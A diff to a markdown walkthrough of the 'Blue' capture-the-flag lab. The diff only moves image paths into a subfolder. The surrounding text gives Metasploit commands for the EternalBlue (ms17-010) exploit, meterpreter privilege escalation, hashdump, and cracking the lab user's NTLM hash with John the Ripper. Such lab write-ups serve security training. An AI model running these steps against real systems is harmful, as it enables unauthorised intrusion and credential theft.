@@ -21,17 +21,17 @@ We can answer these questions with just one nmap scan:
 nmap --script vuln target IP
 ```
 This will return  all open ports (9 in total, **3** under port 1000) and all known vulnerabilities (including the EternalBlue exploit, or **ms17-010**). 
-![ports](images/ports.png)
+![ports](images/blue/ports.png)
 ## Gain Access
 To get through this section you'll need to install the [Metasploit framework](https://www.metasploit.com/). Then:
 1. become root: `sudo su`
 2. open up metasploit: `msfconsole`
 3. set your local IP address to LHOST: `set LHOST` `tun0` and `LPORT` to a random port that is not already in use (e.g. `set LPPRT 4444`)
 4. search metasploit's database for the EternalBlue exploit: `search ms17-010`
-	- ![ms17-010](images/ms17-010.png)
+	- ![ms17-010](images/blue/ms17-010.png)
 5. use the exploit: `use`
 6. show the options for the exploit: `show options`. You'll get "**RHOSTS**" as the first result
-	- ![show options](images/options.png)
+	- ![show options](images/blue/options.png)
 7. now set RHOSTS as the target machine's IP address: `set RHOSTS` target_ip
 8. paste 
 ```
@@ -42,45 +42,45 @@ Background the session with Ctrl+z (then press `y` when prompted)
 Let's now search the Metasploit database for info on how to convert a shell to a meterpreter shell:
 `search shell_to_meterpreter`
 
-![shell](images/shell.png)
+![shell](images/blue/shell.png)
 
 This way we will get the answer: `post/multi/manage/shell_to_meterpreter`
 Use this post module with `use 0` and show its' options with `show options`
 
-![session](images/session.png)
+![session](images/blue/session.png)
 
 Since we have two sessions going on, we will have to change the `SESSION` option to 1 with `session -i 1`. To know to which session you have to switch, use the command `sessions -l`
 
-![sessions](images/sessions.png)
+![sessions](images/blue/sessions.png)
 
 Now run the exploit with `run`
 Once we get the `[*] Stopping exploit/multi/handler` message, press `Ctrl+c` to stop that payload and select the session you just created with `sessions -i 2` or whatever number your session is (look for it with `sessions -l`).
 
-![session2](/images/session2.png)
+![session2](/images/blue/session2.png)
 
-![meterpreter](images/meterpreter.png)
+![meterpreter](images/blue/meterpreter.png)
 
 The getsystem command will now return this:
 
-![system](images/sytstem.png)
+![system](images/blue/sytstem.png)
 
 You can also list oll the processes with the ps command and you can migrate to one of these.
 
-![ps](images/ps.png)
+![ps](images/blue/ps.png)
 
 Find a process that runs at NT AUTHORITY\SYSTEM and copy its' PID.
 Now migrate to it with `migrate` and the PID (e.g. `migrate 2868`).
 ## Cracking
 Now use the hashdump command
 
-![hashdump](images/hashdump.png)
+![hashdump](images/blue/hashdump.png)
 
 Jon is the non-default user. Copy the NTLM digest.
 Then we'll copy the digest to a file with `echo Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d::: > hash.txt`
 We'll run John The Ripper on the file with `john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
 > This will return alqfna22 as the password.
 
-![john](images/john.png)
+![john](images/blue/john.png)
 
 ## Find flags!
 
